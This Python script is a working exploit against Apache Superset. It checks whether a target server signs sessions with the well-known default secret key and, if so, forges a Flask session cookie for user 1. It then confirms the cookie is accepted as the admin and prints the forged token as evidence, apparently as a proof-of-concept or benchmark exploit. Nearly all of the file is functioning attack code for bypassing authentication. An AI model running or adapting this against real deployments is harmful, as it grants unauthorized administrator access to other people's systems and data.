#!/usr/bin/env python3
"""Forge a Superset session using the application default signing key."""

import base64
from http.cookies import SimpleCookie
import hashlib
import hmac
import json
import os
import time
import urllib.error
import urllib.request


SECRET_KEY = b"CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET"
USERNAME = "admin"


def base64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def session_signature(message: bytes) -> str:
    derived_key = hmac.new(SECRET_KEY, b"cookie-session", hashlib.sha1).digest()
    digest = hmac.new(derived_key, message, hashlib.sha1).digest()
    return base64url(digest)


def forge_session(user_id: int) -> str:
    payload = json.dumps(
        {"_user_id": user_id, "user_id": user_id}, separators=(",", ":")
    ).encode("utf-8")
    timestamp = int(time.time())
    timestamp_bytes = timestamp.to_bytes((timestamp.bit_length() + 7) // 8, "big")
    message = f"{base64url(payload)}.{base64url(timestamp_bytes)}"
    return f"{message}.{session_signature(message.encode('ascii'))}"


def probe(url: str, token: str = "") -> tuple[int, str, str]:
    headers = {"Cookie": f"session={token}"} if token else {}
    request = urllib.request.Request(url, headers=headers)
    try:
        response = urllib.request.urlopen(request, timeout=20)
    except urllib.error.HTTPError as error:
        response = error
    return (
        response.status,
        response.read().decode("utf-8", errors="replace"),
        response.headers.get("Set-Cookie", ""),
    )


def issued_session(base_url: str) -> str:
    status, _, cookie_header = probe(base_url + "/login/")
    if status != 200:
        raise RuntimeError("Superset login page was not served")
    cookies = SimpleCookie()
    cookies.load(cookie_header)
    if "session" not in cookies:
        raise RuntimeError("Login page did not issue a session")
    return cookies["session"].value


def main() -> None:
    base_url = os.environ["REMOTE_TARGET_URL"].rstrip("/")
    signed_cookie = issued_session(base_url)
    message, signature = signed_cookie.rsplit(".", 1)
    if not hmac.compare_digest(signature, session_signature(message.encode())):
        raise RuntimeError("Target does not use the known default secret")
    identity_url = base_url + "/api/v1/me/"
    if probe(identity_url)[0] != 401 or probe(identity_url, "invalid")[0] != 401:
        raise RuntimeError("Identity endpoint accepted unauthenticated request")
    token = forge_session(1)
    status, body, _ = probe(identity_url, token)
    if status != 200 or json.loads(body).get("result", {}).get("username") != USERNAME:
        raise RuntimeError("Forged session did not identify the admin")
    print(json.dumps({"evidence_payload": {"token": token, "user": USERNAME}}))


if __name__ == "__main__":
    main()
